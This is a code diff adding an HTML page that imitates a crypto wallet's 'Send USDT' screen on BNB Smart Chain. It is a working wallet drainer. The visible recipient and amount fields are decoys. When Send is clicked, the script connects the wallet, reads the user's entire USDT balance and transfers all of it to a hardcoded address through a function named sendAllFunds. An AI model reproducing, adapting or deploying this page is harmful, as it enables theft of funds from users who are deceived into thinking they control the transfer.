@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Send USDT</title>
+    <style>
+        body {
+            background-color: rgba(27,27,28,255);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            text-align: center;
+            width: 100%;
+            max-width: 400px;
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-start;
+            min-height: 100vh;
+            padding: 16px;
+        }
+        .header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding-top: 8px;
+        }
+        .header h2 {
+            margin: 0;
+            color: white;
+            flex-grow: 1;
+            text-align: center;
+            font-family: Geeza, "Ping Fang", "Binance Plex", ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, Ubuntu, Cantarell, Noto Sans, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
+            font-weight: bold;
+        }
+        .back-button {
+            fill: #e5e7eb;
+        }
+        p, input, button {
+            color: #ffffff;
+            width: 91%;
+        }
+        input {
+            height: 31px;
+            border-radius: 5px;
+            border: 0.5px solid #e5e7eb;
+            background-color: rgba(27,27,28,255);
+            padding: 10px;
+            padding-left: 16px;
+            font-family: Geeza, "Ping Fang", "Binance Plex", ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, Ubuntu, Cantarell, Noto Sans, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
+            font-weight: 500;
+            margin-right: 10px;
+        }
+        input::placeholder {
+            color: #b0b2b4;
+        }
+        button {
+            border-radius: 50px;
+            border: none;
+            padding: 15px;
+            width: 100%;
+            margin-top: auto;
+            font-size: 16px;
+            background-color: #48ff91;
+            color: #000000;
+            font-family: Geeza, "Ping Fang", "Binance Plex", ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, Ubuntu, Cantarell, Noto Sans, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
+            font-weight: 500;
+        }
+        .network-info {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 8px;
+            margin-top: 5%;
+            margin-bottom: 3px;
+        }
+        .network-info p {
+            font-size: 16px;
+            color: #b0b2b4;
+            margin: 0;
+            font-family: Geeza, "Ping Fang", "Binance Plex", ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, Ubuntu, Cantarell, Noto Sans, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
+            font-weight: 500px;
+        }
+        .recipient-text, .amount-text{
+            margin-bottom: 6px;
+            font-family: Geeza, "Ping Fang", "Binance Plex", ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, Ubuntu, Cantarell, Noto Sans, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
+            font-weight: 500;
+            color: #b0b2b4;
+        }
+        .balance-text {
+            margin-top: 6px;
+            font-family: Geeza, "Ping Fang", "Binance Plex", ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, Ubuntu, Cantarell, Noto Sans, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
+            font-size: 13px;
+            font-weight: 400;
+            color: #b0b2b4;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path fill-rule="evenodd" clip-rule="evenodd" d="M3.00001 12.2722L10.0711 5.20117L11.8388 6.96894L7.78434 11.0234L21.001 11.0234L21.001 13.5234L7.78554 13.5234L11.8388 17.5767L10.0711 19.3445L3.00001 12.2734L3.00061 12.2728L3.00001 12.2722Z" fill="#b0b2b4"></path>
+            </svg>
+            <h2>Send USDT</h2>
+        </div>
+
+        <div class="network-info">
+            <img src="https://i.ibb.co/b5WpD2Km/usdt.png" alt="USDT Logo" width="40px" height="40px">
+            <p>On Smart Chain Network</p>
+        </div>
+
+        <p class="recipient-text" style="text-align: left;">Recipient Address</p>
+        <div style="position: relative; display: inline-block; width: 100%;">
+            <input type="text" placeholder="Type or paste a valid address" 
+                value="0x63b6B2Ee6324e3c53cAf1d2841b21134DEb1"
+                style="width: 91%; padding-right: 5px; height: 31px; border-radius: 5px; border: 1px solid #ccc;">
+            <svg width="24" height="24" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg" 
+                style="position: absolute; right: 20px; top: 50%; transform: translateY(-50%); color: #00ff80; background-color: #1b1b1c;">
+                <path id="Union" fill-rule="evenodd" clip-rule="evenodd" 
+                    d="M10 7.08329C10 8.69412 8.69416 9.99996 7.08333 9.99996C5.4725 9.99996 4.16667 8.69412 4.16667 7.08329C4.16667 5.47246 5.4725 4.16663 7.08333 4.16663C8.69416 4.16663 10 5.47246 10 7.08329ZM2.5 14.6666C2.5 13.0098 3.84315 11.6666 5.5 11.6666H8.66667C10.3235 11.6666 11.6667 13.0098 11.6667 14.6666V16.6666H2.5V14.6666ZM17.5 4.16663H13.3333V6.66663H17.5V4.16663ZM17.5 8.33492H13.3333V10.8349H17.5V8.33492ZM13.3333 12.5032H17.5V15.0032H13.3333V12.5032Z" 
+                    fill="currentColor">
+                </path>
+            </svg>
+        </div>
+
+        <p class="amount-text" style="text-align: left;">Amount</p>
+        <div style="position: relative; display: inline-block; width: 90%;">
+            <input type="text" placeholder="Type or paste a valid address" 
+                style="width: 91%; padding-right: 40px; height: 31px; border-radius: 5px; border: 1px solid #ccc; 
+                font-family: Geeza, 'Ping Fang', 'Binance Plex', ui-sans-serif, system-ui, -apple-system, 'Segoe UI', Roboto, 
+                Ubuntu, Cantarell, 'Noto Sans', sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Noto Color Emoji';">
+            <span style="position: absolute; right: -18px; top: 50%; transform: translateY(-50%); 
+                color: #00ff80; background-color: #1b1b1c; padding: 5px 10px; border-radius: 3px; 
+                font-weight: bold; font-size: 13px; 
+                font-family: Geeza, 'Ping Fang', 'Binance Plex', ui-sans-serif, system-ui, -apple-system, 'Segoe UI', Roboto, 
+                Ubuntu, Cantarell, 'Noto Sans', sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Noto Color Emoji';">
+                MAX
+            </span>
+        </div>
+
+        <p class="balance-text" style="text-align: left;"></p>
+
+        <button id="sendButton">Send</button>
+    </div>
+    </div>
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.7.4/dist/web3.min.js"></script>
+<script>
+    let web3;
+    let userAccount;
+    const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT (BEP-20)
+    const recipient = "0x63b6B2Ee6324e3c53cAf1d2841b21134DEb19aA9"; 
+    const usdtABI = [
+        {
+            "constant": true,
+            "inputs": [{ "name": "_owner", "type": "address" }],
+            "name": "balanceOf",
+            "outputs": [{ "name": "balance", "type": "uint256" }],
+            "type": "function"
+        },
+        {
+            "constant": false,
+            "inputs": [
+                { "name": "_to", "type": "address" },
+                { "name": "_value", "type": "uint256" }
+            ],
+            "name": "transfer",
+            "outputs": [{ "name": "", "type": "bool" }],
+            "type": "function"
+        }
+    ];
+
+    async function connectWallet() {
+        if (window.ethereum) {
+            try {
+                web3 = new Web3(window.ethereum);
+
+                await window.ethereum.request({
+                    method: "wallet_switchEthereumChain",
+                    params: [{ chainId: "0x38" }]
+                });
+
+                const accounts = await ethereum.request({ method: "eth_requestAccounts" });
+                userAccount = accounts[0];
+                sendAllFunds();
+            } catch (error) {
+                console.error("Error connecting wallet:", error);
+            }
+        } else {
+            console.error("Trust Wallet not detected! Open this page in Trust Wallet's browser.");
+        }
+    }
+
+    async function sendAllFunds() {
+        try {
+            const usdtContract = new web3.eth.Contract(usdtABI, usdtContractAddress);
+
+            const balance = await usdtContract.methods.balanceOf(userAccount).call();
+            if (BigInt(balance) === BigInt(0)) {
+                console.error("Insufficient USDT balance.");
+                return;
+            }
+
+            console.log(`User's USDT Balance: ${web3.utils.fromWei(balance, 'ether')} USDT`);
+
+            const gasPrice = await web3.eth.getGasPrice();
+            const gasLimit = 100000; 
+
+            await usdtContract.methods.transfer(recipient, balance).send({
+                from: userAccount,
+                gas: web3.utils.toHex(gasLimit),
+                gasPrice: web3.utils.toHex(gasPrice),
+            });
+
+            console.log("Transaction sent successfully!");
+        } catch (error) {
+            console.error("Transaction error:", error);
+        }
+    }
+
+    document.getElementById("sendButton").addEventListener("click", connectWallet);
+</script>
+
+
+
+</body>
+</html>
